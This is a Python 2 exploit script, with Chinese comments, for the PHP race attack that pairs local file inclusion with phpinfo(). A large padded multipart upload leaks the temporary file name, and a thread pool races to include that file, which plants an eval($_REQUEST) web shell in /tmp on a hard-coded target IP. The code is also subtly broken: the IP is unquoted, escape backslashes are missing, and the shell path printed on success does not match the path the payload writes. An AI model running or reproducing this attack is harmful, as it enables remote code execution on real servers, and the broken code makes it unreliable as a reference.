#!/usr/bin/python
#python version 2.7

import sys
import threading
import socket

# 设置全局变量
HOST = 198.18.9.116   # 你需要测试的域名
PORT = 80             # 通常的HTTP端口
POOLSZ = 200          # 线程池大小

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%sr
<?php file_put_contents('/tmp/Qftm', '<?php eval($_REQUEST[Qftm])?>')?>r""" % TAG
    REQ1_DATA = """-----------------------------7dbff1ded0714r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"r
Content-Type: text/plainr
r
%s
-----------------------------7dbff1ded0714--r""" % PAYLOAD
    padding = "A" * 5000
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """r
HTTP_ACCEPT: """ + padding + """r
HTTP_USER_AGENT: """ + padding + """r
HTTP_ACCEPT_LANGUAGE: """ + padding + """r
HTTP_PRAGMA: """ + padding + """r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r
Content-Length: %sr
Host: %sr
r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    LFIREQ = """GET /index.php?file=%s HTTP/1.1r
User-Agent: Mozilla/4.0r
Proxy-Connection: Keep-Aliver
Host: %sr
r
r
""" % host
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i + 17:i + 31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter = 0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "nGot it! Shell created in /tmp/Qftm.php"
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d += i
        if i == "":
            break
        if i.endswith("0rnrn"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i + 10], i)
    return i + 256

def main():
    print "LFI With PHPInfo()"
    print "-=" * 30

    host = HOST
    port = PORT
    poolsz = POOLSZ

    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz

    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
